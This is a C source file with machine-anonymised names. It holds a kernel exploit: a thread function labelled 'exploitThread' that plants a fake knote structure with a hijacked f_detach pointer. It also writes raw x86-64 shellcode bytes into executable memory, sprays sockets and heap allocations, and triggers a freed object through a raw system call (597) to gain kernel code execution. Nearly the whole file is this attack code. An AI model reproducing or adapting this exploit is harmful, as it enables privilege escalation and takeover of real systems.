
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int uint8_t ;
typedef int uint64_t ;
typedef int trampolinecode ;
struct knote {struct filterops* kn_fop; } ;
struct filterops {void* f_detach; } ;
typedef int int64_t ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int FUNC_0 (int,int) ;
 int FUNC_1 (int) ;
 int FUNC_2 (void*,int*,int) ;
 void* FUNC_3 (int *,int,int,int,int,int ) ;
 int FUNC_4 (int*,int) ;
 scalar_t__ VAR_13 ;
 int FUNC_5 (char*,...) ;
 int FUNC_6 (int,int,int*) ;
 int FUNC_7 (int ,int,int,int*) ;
 int FUNC_8 (char*,int ,int ,int ) ;
 int FUNC_9 (int) ;
 int FUNC_10 (int,int,int*,int*) ;

void *FUNC_11(void *VAR_14) {
 FUNC_5("[+] Entered exploitThread\n");

 uint64_t VAR_15 = 0x8000;
 uint64_t VAR_16 = 0x8000;
 uint64_t VAR_17 = VAR_15 + VAR_16;


 uint64_t VAR_18 = (VAR_17 + VAR_5 - 1) & ~(VAR_5 - 1);

 uint8_t *VAR_19 = FUNC_3(((void*)0), VAR_18 + VAR_5, VAR_10 | VAR_11, VAR_1 | VAR_2, -1, 0);
 FUNC_4(VAR_19 + VAR_18, VAR_5);

 uint8_t *VAR_20 = VAR_19 + VAR_18 - VAR_17;

 int64_t VAR_21 = (0x100000000 + VAR_15) / 4;


 struct knote VAR_22;
 struct filterops VAR_23;
 struct knote **VAR_24 = (struct knote **)(VAR_20 + VAR_15);
 VAR_24[2] = &VAR_22;
 VAR_22.kn_fop = &VAR_23;


 void *VAR_25 = ((void*)0);
 void *VAR_26 = ((void*)0);
 int VAR_27;
 int VAR_28;
 uint8_t VAR_29[] = {
  0x58,
  0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF,
  0x50,
  0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE,
  0xFF, 0xE0
 };


 FUNC_7(0, VAR_5, VAR_7 | VAR_8 | VAR_6, &VAR_27);
 FUNC_6(VAR_27, VAR_7 | VAR_8, &VAR_28);


 VAR_26 = FUNC_3(((void*)0), VAR_5, VAR_10 | VAR_9, VAR_3, VAR_27, 0);
 VAR_25 = FUNC_3(((void*)0), VAR_5, VAR_10 | VAR_11, VAR_2 | VAR_4, VAR_28, 0);


 FUNC_2(VAR_25, VAR_29, sizeof(VAR_29));
 *(void **)(VAR_25 + 14) = (void *)VAR_13;


 VAR_23.f_detach = VAR_26;


 int VAR_30[0x2000];
 int VAR_31[50], VAR_32 = 0, VAR_33 = 0;
 int VAR_34 = (VAR_15 - 0x800) / 8;

 FUNC_5("[+] Creating %d sockets\n", VAR_34);


 for(int VAR_35 = 0; VAR_35 < 0x2000; VAR_35++) {
  VAR_30[VAR_35] = FUNC_8("sss", VAR_0, VAR_12, 0);
  if(VAR_30[VAR_35] >= VAR_34) {
   VAR_30[VAR_35 + 1] = -1;
   break;
  }
 }


 for(int VAR_36 = 0; VAR_36 < 50; VAR_36++) {
  VAR_31[VAR_36] = FUNC_0(VAR_15, VAR_34);
  FUNC_5("[+] allocation = %llp\n", VAR_31[VAR_36]);
 }


 VAR_32 = FUNC_0(VAR_15, VAR_34);
 VAR_33 = FUNC_0(VAR_15, VAR_34);
 FUNC_1(VAR_32);


 int VAR_37 = FUNC_10(597, 1, VAR_19, &VAR_21);
 FUNC_5("[+] Result: %d\n", VAR_37);


 FUNC_5("[+] Freeing m2\n");
 FUNC_1(VAR_33);


 for(int VAR_38 = 0; VAR_38 < 0x2000; VAR_38++) {
  if(VAR_30[VAR_38] == -1)
   break;
  FUNC_9(VAR_30[VAR_38]);
 }


 for(int VAR_39 = 0; VAR_39 < 50; VAR_39++) {
  FUNC_1(VAR_31[VAR_39]);
 }


 FUNC_4(VAR_19, VAR_18);

 return ((void*)0);
}
